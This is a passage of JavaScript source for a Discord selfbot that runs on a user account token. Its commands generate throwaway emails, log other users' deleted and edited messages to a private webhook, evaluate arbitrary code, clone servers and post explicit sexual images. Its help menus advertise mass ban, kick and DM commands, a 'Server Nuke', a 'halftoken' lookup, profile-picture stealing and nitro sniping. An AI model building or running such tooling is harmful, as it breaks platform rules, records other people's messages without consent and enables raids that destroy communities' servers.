                        embed.setTitle('Email')
                        embed.setDescription("Usage: " + prefix + "email toggle [ON/OFF]")
 
                        send({
                            embed: embed.toJSON()
                        })
                        msg.delete()
                        return
                    }
                    settings.email = setting
                } else {
                    settings.email = !settings.email
                }
                fs.writeFileSync("settings.json", JSON.stringify(settings))
                let embed = new Discord.RichEmbed()
                        embed.setColor(((settings.email == true) && 0x6cc24a) || 0xff0000)
                        embed.setTitle('Email')
                        embed.setDescription(((settings.email == true) && "Enabled Emailservices") || "Disabled Emailservices")
               
                send({
                    embed: embed.toJSON()
                })
                msg.delete()
                return
            }
            if (args[0].toLowerCase() == "generate") {
                settings.emails = settings.emails == undefined ? [] : settings.emails
                if (settings.emails.length < 10) {
                    var mail = crypto.randomBytes(4).toString('hex') + "@vewku.com"
                    let embed = new Discord.RichEmbed()
                        embed.setColor(ec)
                        embed.setTitle('Email')
                        embed.setDescription("Generated Email: ```" + mail + "```")
                    settings.emails.push(mail)
                    fs.writeFileSync("settings.json", JSON.stringify(settings))
                    send({
                        embed: embed.toJSON()
                    })
                    msg.delete()
                    return
                } else {
                    let embed = new Discord.RichEmbed()
                        embed.setColor(ec)
                        embed.setTitle('Email')
                        embed.setDescription("You exceeded the maximum amount of 10 Emails! Delete one with " + prefix + "email delete [email] !")
                    
                    send({
                        embed: embed.toJSON()
                    })
                    msg.delete()
                    return
                }
            }
            if (args[0].toLowerCase() == "remove") {
                settings.emails = settings.emails == undefined ? [] : settings.emails
                if (args[1]) {
                    if (settings.emails.includes(args[1])) {
                        let embed = new Discord.RichEmbed()
                        embed.setColor(ec)
                        embed.setTitle('Email')
                        embed.setDescription("Removed the email **" + args[1] + "**!")
                        settings.emails.splice(settings.emails.indexOf(args[1]), 1)
                        fs.writeFileSync("settings.json", JSON.stringify(settings))
                        send({
                            embed: embed.toJSON()
                        })
                        msg.delete()
                        return
                    } else {
                        let embed = new Discord.RichEmbed()
                        embed.setColor(ec)
                        embed.setTitle('Email')
                        embed.setDescription("Could not find the Email **" + args[1] + "** in the Database.")
                        
                        send({
                            embed: embed.toJSON()
                        })
                        msg.delete()
                        return
                    }
                } else {
                    let embed = new Discord.RichEmbed()
                        embed.setColor(ec)
                        embed.setTitle('Email')
                        embed.setDescription("Usage: **" + prefix + "email remove [email]**!")
                    
                    send({
                        embed: embed.toJSON()
                    })
                    msg.delete()
                    return
                }
            }
            if (args[0].toLowerCase() == "list") {
                settings.emails = settings.emails == undefined ? [] : settings.emails
                if (settings.emails.length > 0) {
                    var mails = settings.emails.join("\n")
                    let embed = new Discord.RichEmbed()
                    embed.setColor(ec)
                    embed.setTitle('Email')
                    embed.setDescription("Your Emails: ```" + mails + "```")
                    
                    send({
                        embed: embed.toJSON()
                    })
                    msg.delete()
                    return
                } else {
                    let embed = new Discord.RichEmbed()
                    embed.setColor(ec)
                    embed.setTitle('Email')
                    embed.setDescription("You do not have any mails right now, generate one with **" + prefix + "email generate**!")

                    send({
                        embed: embed.toJSON()
                    })
                    msg.delete()
                    return
                }
            }
        } else {
            let embed = new Discord.RichEmbed()
                    embed.setColor(ec)
                    embed.setTitle('Email')
                    embed.setDescription("Usage: " + prefix + "email [toggle/generate/remove/list]")
        
            send({
                embed: embed.toJSON()
            })
            msg.delete()
            return
        }
    },
    "logger": function (msg, args, send) {
        if (settings.private == undefined) {
            settings.private = false
        }
        if (args[0]) {
            var setting;
            if (args[0].toUpperCase() == "ON") {
                setting = true
            } else if (args[0].toUpperCase() == "OFF") {
                setting = false
            }
            if (setting == undefined) {
                let embed = new Discord.RichEmbed()
                    embed.setColor(ec)
                    embed.setTitle('MessageLogger')
                    embed.setDescription("Usage: " + prefix + "logger [ON/OFF]")
                
                send({
                    embed: embed.toJSON()
                })
                msg.delete()
                return
            }
            settings.logger = setting
        } else {
            settings.logger = !settings.logger
        }
        fs.writeFileSync("settings.json", JSON.stringify(settings))
        let embed = new Discord.RichEmbed()
                    embed.setColor(((settings.logger == true) && 0x6cc24a) || 0xff0000)
                    embed.setTitle('MessageLogger')
                    embed.setDescription(((settings.logger == true) && "Enabled Messagelogger") || "Disabled Messagelogger")

        send({
            embed: embed.toJSON()
        })
        msg.delete()
    },
    "suicide": async function (msg, args, send) {
        let embed = new Discord.RichEmbed()
        embed.setTitle(`I'm ending it all today...`)
        embed.setColor(ec)
        embed.setImage(`https://static.zerochan.net/Suicide.full.1111437.jpg`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "playing": async function (msg, args, send) {
        client.user.setActivity(args.join(" "), {
            type: "PLAYING"
        })
        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setTitle(`Status: Playing`)
        embed.setDescription(`**Activity: ${args.join(" ")}**`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "watching": async function (msg, args, send) {
        client.user.setActivity(args.join(" "), {
            type: "WATCHING"
        })
        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setTitle(`Status: Watching`)
        embed.setDescription(`**Activity: ${args.join(" ")}**`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "streaming": async function (msg, args, send) {
        client.user.setActivity(args.join(" "), {
            type: "STREAMING"
        })
        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setTitle(`Status: Streaming`)
        embed.setDescription(`**Activity: ${args.join(" ")}**`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "listening": async function (msg, args, send) {
        client.user.setActivity(args.join(" "), {
            type: "LISTENING"
        })
        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setTitle(`Status: Listening`)
        embed.setDescription(`**Activity: ${args.join(" ")}**`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "trap": async function (msg, args, send) {
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/trap`);
        let embed = new Discord.RichEmbed()
        embed.setTitle(`Here's a nice trap!`)
        embed.setColor(ec)
        embed.setImage(body.url)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "solo": async function (msg, args, send) {
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/solo`);
        let embed = new Discord.RichEmbed()
        embed.setTitle(`Here's some nice Hentai!`)
        embed.setColor(ec)
        embed.setImage(body.url)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "hentai": async function (msg, args, send) {
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/classic`);
        let embed = new Discord.RichEmbed()
        embed.setTitle(`Here's some nice hentai!`)
        embed.setColor(ec)
        embed.setImage(body.url)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "pp": async function (msg, args, send) {
        if (msg.channel.type !== "dm") {
            let user = msg.mentions.users.first() || msg.guild.members.find(mem => mem.user.id === args[0]) || msg.guild.members.find(mem => mem.user.username === args[0]) || msg.guild.members.find(mem => mem.user.tag === args[0]) || msg.guild.members.get(args[0]) || msg.author

            let s = "=".repeat(Math.floor(Math.random() * 14))
            let embed = new Discord.RichEmbed()
            embed.setTitle(`PP Machine`)
            embed.setColor(ec)
            embed.setDescription(`**${user}'s PP:
        8${s}D**`)
            send({
                embed: embed.toJSON()
            }).then(() => {
                msg.delete()
            })
        } else if (msg.channel.type == "dm") {
            let user = msg.author
            let s = "=".repeat(Math.floor(Math.random() * 14))
            let embed = new Discord.RichEmbed()
            embed.setTitle(`PP Machine`)
            embed.setColor(ec)
            embed.setDescription(`**${user}'s PP:
        8${s}D**`)
            send({
                embed: embed.toJSON()
            }).then(() => {
                msg.delete()
            })
        }
    },
    "randomnum": async function (msg, args, send) {
        let r = Math.floor(Math.random() * 10000)
        let embed = new Discord.RichEmbed()
        embed.setTitle(`Random Number Gen`)
        embed.setColor(ec)
        embed.setDescription(`**${r}**`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "bravery": async function (msg, args, send) {
        var request = require('request');
        var options = {
            'method': 'POST',
            'url': 'https://discordapp.com/api/v6/hypesquad/online',
            'headers': {
                'authorization': settings.token,
            },
            body: JSON.stringify({
                "house_id": 1
            })

        };
        request(options, function (error, response) {
            if (error) throw new Error(error);
            console.log(response.body);
        });
        let embed = new Discord.RichEmbed()
        embed.setThumbnail(`https://vignette.wikia.nocookie.net/hypesquad/images/4/41/BraveryLogo.png/revision/latest?cb=20180825044200`)
        embed.setColor(ec)
        embed.setTitle(`House Changed`)
        embed.setDescription(`**New House: Bravery**`)
        embed.setFooter(`7s Cooldown`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "brilliance": async function (msg, args, send) {
        var request = require('request');
        var options = {
            'method': 'POST',
            'url': 'https://discordapp.com/api/v6/hypesquad/online',
            'headers': {
                'authorization': settings.token,
                'content-type': 'application/json',
            },
            body: JSON.stringify({
                "house_id": 2
            })

        };
        request(options, function (error, response) {
            if (error) throw new Error(error);
            console.log(response.body);
        });
        let embed = new Discord.RichEmbed()
        embed.setThumbnail(`https://vignette.wikia.nocookie.net/hypesquad/images/8/8f/BrillianceLogo.png/revision/latest/scale-to-width-down/340?cb=20180825045035`)
        embed.setColor(ec)
        embed.setTitle(`House Changed`)
        embed.setDescription(`**New House: Briliance**`)
        embed.setFooter(`7s Cooldown`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "balance": async function (msg, args, send) {
        var request = require('request');
        var options = {
            'method': 'POST',
            'url': 'https://discordapp.com/api/v6/hypesquad/online',
            'headers': {
                'authorization': settings.token,
                'content-type': 'application/json',
            },
            body: JSON.stringify({
                "house_id": 3
            })

        };
        request(options, function (error, response) {
            if (error) throw new Error(error);
            console.log(response.body);
        });
        let embed = new Discord.RichEmbed()
        embed.setThumbnail(`https://aesthetics-peace.s-ul.eu/S7RuLi2WwPf5Yg8C`)
        embed.setColor(ec)
        embed.setTitle(`House Changed`)
        embed.setDescription(`**New House: Balance**`)
        embed.setFooter(`7s Cooldown`)
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "eval": async function (msg, args, send) {
        try {
            const response = String(eval(args.join(' ')))
            send(`\`\`\`js\n${response.replace(/\s+/g, ' ').split('\\').join('\\\\').split('`').join('\`')}\n\`\`\``)
            .catch(async (e) =>  {
                send(String(e))
            })
        } catch (ex) {
            send(`\`\`\`c\n${ex}\n\`\`\``)
        }
    },
    "servroles": async function (msg, args, send) {
        if (msg.guild.roles.map(r => r.toString()).join("").length > 2000) return send('This server has too many roles to display (' + msg.guild.roles.size + ' roles)')
        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setTitle(`${msg.guild.name}'s Roles`)
        embed.setDescription(msg.guild.roles.map(r => r.toString()).join(""))
        send({
            embed: embed.toJSON()
        }).then(() => msg.delete())
    },
    "hug": async function (msg, args, send) {
        let user = msg.mentions.users.first()
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/hug`);
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**${msg.author} Hugs ${user}**`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`'ฅ(≈>ܫ<≈)♥`)
        embed.setTimestamp()
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "fuck": async function (msg, args, send) {
        let user = msg.mentions.users.first() || msg.author
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/classic`);
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**${msg.author} Fucks ${user}**`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`'ฅ(≈>ܫ<≈)♥`)
        embed.setTimestamp()
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "kiss": async function (msg, args, send) {
        let user = msg.mentions.users.first()
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/kiss`);
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**${msg.author} Kisses ${user}**`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`'ฅ(≈>ܫ<≈)♥`)
        embed.setTimestamp()
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "suck": async function (msg, args, send) {
        let user = msg.mentions.users.first() || msg.author
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/bj`);
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**${msg.author} Sucks off ${user}**`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`'ฅ(≈>ܫ<≈)♥`)
        embed.setTimestamp()
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "rsuck": async function (msg, args, send) {
        let user = msg.mentions.users.first() || msg.author
        var {
            body
        } = await superagent
            .get(`https://nekos.life/api/v2/img/bj`);
        let embed = new Discord.RichEmbed()
        embed.setDescription(`**${user} Sucks off ${msg.author}**`)
        embed.setColor(ec)
        embed.setImage(body.url)
        embed.setFooter(`'ฅ(≈>ܫ<≈)♥`)
        embed.setTimestamp()
        send({
            embed: embed.toJSON()
        }).then(() => {
            msg.delete()
        })
    },
    "uinfo": async function (msg, args, send) {
        var guild = await msg.guild.fetchMembers()
        let user = msg.mentions.users.first() || guild.members.find(mem => mem.user.username === args[0]) || guild.members.find(mem => mem.user.tag === args[0]) || guild.members.get(args[0]) || msg.author
        if (!user) user = msg.author
        if (user.bot) {
            var members = guild.members.array();
            await members.sort((a, b) => a.joinedAt - b.joinedAt);
            let abcd = user.displayAvatarURL
            let gameplayed = user.presence.game || 'No game'
            let embed = new Discord.RichEmbed()
            embed.setTitle(`${user.tag}`)
            embed.setThumbnail(abcd)
            embed.setColor(ec)
            embed.setDescription(`User ID: ${user.id}`)
            embed.addField('User Created At', moment(user.createdAt).format("llll"), true)
            embed.addField('User Joined At', moment(msg.guild.member(user).joinedAt).format("llll"), true)
            embed.addField('Game', gameplayed, true)
            embed.addField('Bot', 'True', true)
            embed.addField('Status, dnd/offline are same', user.presence.status)
            embed.addField(`Roles [${msg.guild.member(user).roles.size}]`, msg.guild.member(user).roles.map(r => r.toLocaleString()).join(" "))
            send({
                embed: embed.toJSON()
            }).then(() => {
                msg.delete()
            })
        } else {
            let user = msg.mentions.users.first() || guild.members.find(mem => mem.user.username === args[0]) || guild.members.find(mem => mem.user.tag === args[0]) || guild.members.get(args[0]) || msg.author
            if (!user) user = msg.author
            var members = guild.members.array();
            await members.sort((a, b) => a.joinedAt - b.joinedAt);
            let abcd = user.displayAvatarURL
            let embed = new Discord.RichEmbed()
            let gameplayed = user.presence.game || 'No game'
            embed.setTitle(`${user.tag}`)
            embed.setThumbnail(abcd)
            embed.setColor(ec)
            embed.setDescription(`User ID: ${user.id}`)
            embed.addField('User Created At', moment(user.createdAt).format("llll"), true)
            embed.addField('User Joined At', moment(msg.guild.member(user).joinedAt).format("llll"), true)
            embed.addField('Game', gameplayed, true)
            embed.addField('Bot', 'False', true)
            embed.addField('Status, dnd/offline are same', user.presence.status)
            embed.addField(`Roles [${msg.guild.member(user).roles.size}]`, msg.guild.member(user).roles.map(r => r.toLocaleString()).join(" "))
            send({
                embed: embed.toJSON()
            }).then(() => {
                msg.delete()
            })
        }
    },
    "repeat": async function(msg ,args, send) {
    let time = ms(args[0])
    let message = args.join(" ").slice(args[0].length)
    if(!interval) {
        interval = setInterval(function() { msg.channel.send(message) }, time)
        send(`Starting your message: "${message} " on repeat for ${time}ms`)
        return;
     }
     
    clearInterval(interval)
    interval = undefined;
    send('Ended the message repeating')
   },
    "copydiscord": async function (msg, args, send) {
        if (msg.guild) {
            var mainguild = msg.guild
            let embed = new Discord.RichEmbed()
            embed.setColor(ec)
            embed.setTitle(`Discord Copier`)
            embed.setDescription(`We are now going to duplicate this server and a new version should popup in your serverlist!`)
            
            send({
                embed: embed.toJSON()
            })
            msg.delete()
            var guild = await client.user.createGuild(mainguild.name, mainguild.region, (mainguild.iconURL !== null ? await getimage(mainguild.iconURL) : undefined))
            var categorys = {}
            guild.setAFKTimeout(mainguild.afkTimeout)
            var channels = mainguild.channels.array()
            var mroles = mainguild.roles.array()
            var gchannels = guild.channels.array()
            var roles = {}
            gchannels.forEach(async channel => {
                channel.delete()
            });
            for (var i = 0; i < mroles.length; i++) {
                var role = mroles[i]
                if (role.id == mainguild.id) {
                    var nrole = await guild.defaultRole.edit({
                        name: role.name,
                        color: role.color,
                        hoist: role.hoist,
                        position: role.position,
                        permissions: role.permissions,
                        mentionable: role.mentionable
                    })
                    roles[role.id.toString()] = nrole
                } else {
                    var nrole = await guild.createRole({
                        name: role.name,
                        color: role.color,
                        hoist: role.hoist,
                        position: role.position,
                        permissions: role.permissions,
                        mentionable: role.mentionable
                    })
                    roles[role.id.toString()] = nrole
                }
            }
            await new Promise(async (resolve) => {
                var finished = 0
                var started = 0
                for (var i = 0; i < channels.length; i++) {
                    var channel = channels[i]
                    if (channel.type == "category") {
                        started++
                        var permissionOverwrites = []
                        channel.permissionOverwrites.array().forEach(perms => {
                            var role = roles[perms.id.toString()]
                            if (role) {
                                permissionOverwrites.push({
                                    id: roles[perms.id],
                                    allow: perms.allow,
                                    deny: perms.deny
                                })
                            }
                        })
                        var nchannel = await guild.createChannel(channel.name, {
                            permissionOverwrites: permissionOverwrites,
                            type: channel.type,
                            name: channel.name,
                            position: channel.position,
                            topic: channel.topic,
                            nsfw: channel.nsfw,
                            bitrate: channel.bitrate,
                            userLimit: channel.userLimit,
                            rateLimitPerUser: channel.rateLimitPerUser
                        })
                        categorys[channel.id.toString()] = nchannel
                        finished++
                        if (finished == started) {
                            resolve()
                        }
                    }
                }
            })
            channels.forEach(async channel => {
                if (channel.type != "category") {
                    var permissionOverwrites = []
                    channel.permissionOverwrites.array().forEach(perms => {
                        var role = roles[perms.id.toString()]
                        if (role) {
                            permissionOverwrites.push({
                                id: roles[perms.id],
                                allow: perms.allow,
                                deny: perms.deny
                            })
                        }
                    })
                    var parent
                    if (channel.parent) {
                        await until(_ => categorys[channel.parent.id] != undefined)
                        if (categorys[channel.parent.id]) {
                            parent = categorys[channel.parent.id]
                        }
                    }
                    var nchannel = await guild.createChannel(channel.name, {
                        parent: parent,
                        permissionOverwrites: permissionOverwrites,
                        type: channel.type,
                        name: channel.name,
                        position: channel.position,
                        topic: channel.topic,
                        nsfw: channel.nsfw,
                        userLimit: channel.userLimit,
                        rateLimitPerUser: channel.rateLimitPerUser
                    })
                }
            })
        } else {
            let embed = new Discord.RichEmbed()
            embed.setColor(ec)
            embed.setTitle(`Discord Copier`)
            embed.setDescription(`You executed this command in an Channel thats not in an server!`)
            
            send({
                embed: embed.toJSON()
            })
            msg.delete()
        }
    },
    "contactme": function (msg, args, send) {
        let CONTACTINFO = require('./contact.json')
        let embed = new Discord.RichEmbed()
        embed.setThumbnail(`http://www.clker.com/cliparts/m/j/s/g/j/L/contact-me-no-data-md.png`)
        embed.setColor(ec)
        embed.setTitle(`Contact Me At:`)
        embed.setDescription(`**Roblox Profile:
    ${CONTACTINFO.RobloxProfileLink}

    Steam:
    ${CONTACTINFO.SteamLink}

    V3rmillion:
    ${CONTACTINFO.V3rmillion}
    **`)
        send({
            embed: embed.toJSON()
        }).then(() => msg.delete())
    },
    "fry": function (msg, args, send) {
        if ((msg.mentions.users) && (msg.attachments.size > 0)) {
            var files = Array.from(msg.attachments)
            if (files[0][1].height != undefined) {
                request({
                    url: files[0][1].url,
                    encoding: null
                }, async (err, resp, buffer) => {
                    var pic = await Jimp.read(buffer)
                    await pic.posterize(8)
                    await pic.sepia()
                    send({
                        files: [await pic.getBufferAsync(pic.getMIME())]
                    })
                    msg.delete()
                });
            }
        }
    },
    "help-anime": async function(msg, args, send) {
        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setTitle('Help Section: Anime')
        embed.setDescription(`
        **!suicide**
        **!kiss <user>**
        **!hug <user>**
        **!pout**
        **!hmph**
        **!pat <user>**
        **!neko**
        **!foxgirl**
        **!feed <user>**
        **!slap <user>**
        **!smug**
        **!baka <user>**
        **!poke <user>**
        **!waifu <user>**`)
        send({embed: embed.toJSON()}).then(() => {msg.delete()})
    },
    "help-misc": async function(msg, args, send) {
        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setTitle('Help Section: Misc')
        embed.setDescription(`
        **!gray <file:image>**
        **!halftoken <user>**
        **!roblox <user>**
        **!image <text>**
        **!ascii <text>**
        **!fancy <text>**
        **!bold <text>**
        **!speak <text>**
        **!lyrics <song:name>**
        **!uinfo <user>**
        **!copydiscord**
        **!embed <text>**
        **!pp <user>**
        **!randomnum**
        **!servroles**
        **!contactme**`)
        send({embed: embed.toJSON()}).then(() => {msg.delete()})
    },
    "help": async function(msg, args, send) {
        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setTitle('Help')
        embed.setDescription(`
        **Made By wokeuplikeGuap#7690**
        **!help-user**
        **!help-moderation**
        **!help-util**
        **!help-misc**
        **!help-anime**
        **!help-nsfw**`)
        send({embed: embed.toJSON()}).then(() => {msg.delete()})
    },
    "help-user": async function(msg, args, send) {
        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setTitle('Help Section: User')
        embed.setDescription(`
        **!bravery**
        **!balance**
        **!brilliance**
        **!playing <text>**
        **!watching <text>**
        **!listening <text>**
        **!streaming <text>**
        **!steal-pfp <user>**
        **!eval <code>**
        **!embedcolor <text>**`)
        send({embed: embed.toJSON()}).then(() => {msg.delete()})
    },
    "help-moderation": async function(msg, args, send) {
        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setTitle('Help Section: Moderation')
        embed.setDescription(`
        **!massban**
        **!massunban**
        **!masskick**
        **!massmute**
        **!massunmute**
        **!massdm <REQUIRES:ADMIN>**
        **!wizz -- Server Nuke**`)
        send({embed: embed.toJSON()}).then(() => {msg.delete()})
    },
    "help-util": async function(msg, args, send) {
        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setTitle('Help Section: Util')
        embed.setDescription(`
        **!email <toggle> <generate> <remove>**
        **!logger <on/off>**
        **!safemode <on/off>**
        **!giveaway-snipe <on/off>**
        **!nitro-snipe <on/off>**`)
        send({embed: embed.toJSON()}).then(() => {msg.delete()})
    },
    "help-nsfw": async function(msg, args, send) {
        let embed = new Discord.RichEmbed()
        embed.setColor(ec)
        embed.setTitle('Help Section: NSFW')
        embed.setDescription(`
        **!suck <user>**
        **!rsuck <user> -- You receive**
        **!fuck <user>**
        **!rfuck <user> -- You receive**
        **!nsfwavatar**
        **!yuri**
        **!trap**
        **!hentai**
        **!solo**`)
        send({embed: embed.toJSON()}).then(() => {msg.delete()})
    },
}

client.on("messageDelete", async (msg) => {

    if ((loggerwebhook != undefined) && (settings.logger == true) && (msg.author.id != client.user.id)) {
        var embed = {
            "title": "Message Logger",
            "description": "A message got deleted!",
            "color": 0x6cc24a,
            "fields": [{
                    "name": "Message",
                    "value": msg.content == "" ? "**Embed, cannot be displayed.**" : msg.content,
                    "inline": true
                },
                {
                    "name": "Channel Type",
                    "value": msg.channel.type,
                    "inline": true
                }
            ]
        }
        if (msg.channel.type == "text") {
            embed.fields.push({
                "name": "Channel",
                "value": "#" + msg.channel.name,
                "inline": true
            })
            embed.fields.push({
                "name": "Server",
                "value": msg.guild.name,
                "inline": true
            })
        }
        if (msg.channel.type == "dm") {
            embed.fields.push({
                "name": "Recipient",
                "value": msg.channel.recipient.username + "#" + msg.channel.recipient.discriminator,
                "inline": true
            })
        }
        if (msg.channel.type == "group") {
            var members = client.user.username + "#" + client.user.discriminator
            var recipients = msg.channel.recipients.array()
            for (var i = 0; i < recipients.length; i++) {
                members += "," + recipients[i].username + "#" + recipients[i].discriminator
            }
            embed.fields.push({
                "name": "Members",
                "value": members,
                "inline": true
            })
            embed.fields.push({
                "name": "Group Name",
                "value": msg.channel.name,
                "inline": true
            })
        }
        embed.fields.push({
            "name": "Author",
            "value": msg.author.username + "#" + msg.author.discriminator,
            "inline": true
        })
        loggerwebhook.send("", {
            embeds: [embed]
        }).catch(() => {

        })
    }
})



client.on("messageUpdate", async (oldmsg, msg) => {
    var oldcontent = oldmsg.content,
        newcontent = msg.content
    if (oldcontent == newcontent) {
        return;
    }
    if ((loggerwebhook != undefined) && (settings.logger == true) && (msg.author.id != client.user.id)) {
        var embed = {
            "title": "Message Logger",
            "description": "A message got edited!",
            "color": 0x6cc24a,
            "fields": [{
                    "name": "Old Message",
                    "value": oldcontent == "" ? "**Embed, cannot be displayed.**" : oldcontent,
                    "inline": true
                },
                {
                    "name": "New Message",
                    "value": newcontent == "" ? "**Embed, cannot be displayed.**" : newcontent,
                    "inline": true
                },
                {
                    "name": "Channel Type",
                    "value": msg.channel.type,
                    "inline": true
                }
            ]
        }
        if (msg.channel.type == "text") {
            embed.fields.push({
                "name": "Channel",
                "value": "#" + msg.channel.name,
                "inline": true
            })
            embed.fields.push({
                "name": "Server",
                "value": msg.guild.name,
                "inline": true
            })
        }
        if (msg.channel.type == "dm") {
            embed.fields.push({
                "name": "Recipient",
                "value": msg.channel.recipient.username + "#" + msg.channel.recipient.discriminator,
                "inline": true
            })
        }
        if (msg.channel.type == "group") {
            var members = client.user.username + "#" + client.user.discriminator
            var recipients = msg.channel.recipients.array()
            for (var i = 0; i < recipients.length; i++) {
                members += "," + recipients[i].username + "#" + recipients[i].discriminator
            }
            embed.fields.push({
                "name": "Members",
                "value": members,
                "inline": true
            })
            embed.fields.push({
                "name": "Group Name",
                "value": msg.channel.name,
                "inline": true
            })
        }
        embed.fields.push({
            "name": "Author",
            "value": msg.author.username + "#" + msg.author.discriminator,
            "inline": true
        })
        loggerwebhook.send("", {
            embeds: [embed]
        }).catch(() => {

        })
    }
})

client.on('ready', async () => {
    var guild;
    img = await getimage("https://i.imgur.com/yI4kGWX.png")
    infoimg = await getimage("https://i.imgur.com/yI4kGWX.png")
    // devimg = await getimage("https://i.imgur.com/yI4kGWX.png")
    if (guildid != undefined) {
        var guilds = client.guilds.array()
        for (let i = 0; i < guilds.length; i++) {
            const tempguild = guilds[i];
            if (tempguild.id == guildid) {
                guild = tempguild
                break;
            }
        }
    }
    if (guild == undefined) {
        guild = await client.user.createGuild('wokeupSelfBot', "eu-central", img);
        settings.guild = guild.id
        guildid = guild.id
        var channels = guild.channels.array()
        for (var i = 0; i < channels.length; i++) {
            if (channels[i].delete) {
                channels[i].delete()
            }
        }
        fs.writeFileSync("settings.json", JSON.stringify(settings))
    }
    var channel;
    var loggerchannel;
    var changelogchannel;
    var updatechannel;
    var nitrochannel;
    var giveawaychannel;
    var informationcategory;
    var announcementscategory;
    var snipercategory;
    var emailcategory;
    var codechannel;
    var channels = guild.channels.array();
    for (var i = 0; i < channels.length; i++) {
        var tempchannel = channels[i]
        if ((tempchannel.name == "messages") && (tempchannel.type == "text")) {
            channel = tempchannel
        } else if ((tempchannel.name == "logger") && (tempchannel.type == "text")) {
            loggerchannel = tempchannel
        } else if ((tempchannel.name == "announcements") && (tempchannel.type == "category")) {
            announcementscategory = tempchannel
        } else if ((tempchannel.name == "information") && (tempchannel.type == "category")) {
            informationcategory = tempchannel
        } else if ((tempchannel.name == "changelogs") && (tempchannel.type == "text")) {
            changelogchannel = tempchannel
        } else if ((tempchannel.name == "important") && (tempchannel.type == "text")) {
            updatechannel = tempchannel
        } else if ((tempchannel.name == "sniper-logs") && (tempchannel.type == "category")) {
            snipercategory = tempchannel
        } else if ((tempchannel.name == "nitro") && (tempchannel.type == "text")) {
            nitrochannel = tempchannel
        } else if ((tempchannel.name == "giveaway") && (tempchannel.type == "text")) {
            giveawaychannel = tempchannel
        } else if ((tempchannel.name == "trash-mail") && (tempchannel.type == "category")) {
            emailcategory = tempchannel
        } else if ((tempchannel.name == "codes") && (tempchannel.type == "text")) {
            codechannel = tempchannel
        }
    }
    if (announcementscategory == undefined) {
        announcementscategory = (await guild.createChannel("announcements", {
            type: "category"
        }))
    }
    if (informationcategory == undefined) {
        informationcategory = (await guild.createChannel("information", {
            type: "category"
        }))
    }
    if (snipercategory == undefined) {
        snipercategory = (await guild.createChannel("sniper-logs", {
            type: "category"
        }))
    }
    if (emailcategory == undefined) {
        emailcategory = (await guild.createChannel("trash-mail", {
            type: "category"
        }))
    }
    if (nitrochannel == undefined) {
        nitrochannel = (await guild.createChannel("nitro", {
            topic: "You will find the outputs of our " + prefix + "nitro-snipe command in this channel!.",
            parent: snipercategory
        }))
    }
    if (codechannel == undefined) {
        codechannel = (await guild.createChannel("codes", {
            topic: "You will find the verify codes that get send to your mail generated by " + prefix + "email",
            parent: emailcategory
        }))
    }
    if (giveawaychannel == undefined) {
        giveawaychannel = (await guild.createChannel("giveaway", {
            topic: "You will find the outputs of our " + prefix + "giveaway-snipe command in this channel!.",
            parent: snipercategory
        }))
    }
    if (updatechannel == undefined) {
        updatechannel = (await guild.createChannel("important", {
            topic: "This channel will be used by the Devs to inform you about new Updates regarding the Selfbot.",
            parent: announcementscategory
        }))
    }
    if (changelogchannel == undefined) {
        changelogchannel = (await guild.createChannel("changelogs", {
            topic: "You will find all the changes from the versions you download in this channel.",
            parent: announcementscategory
        }))
    }
    if (channel == undefined) {
        channel = (await guild.createChannel("messages", {
            topic: "If you enable the Safemode with " + prefix + "safemode all outputs from the Selfbot will get redirected to this channel.",
            parent: informationcategory
        }))
    }
    if (loggerchannel == undefined) {
        loggerchannel = (await guild.createChannel("logger", {
            topic: "The message-logger outputs that you can toggle with " + prefix + "logger will be displayed here!",
            parent: informationcategory
        }))
    }
    var webhooks = await channel.fetchWebhooks()
    webhook = webhooks.array()[0]
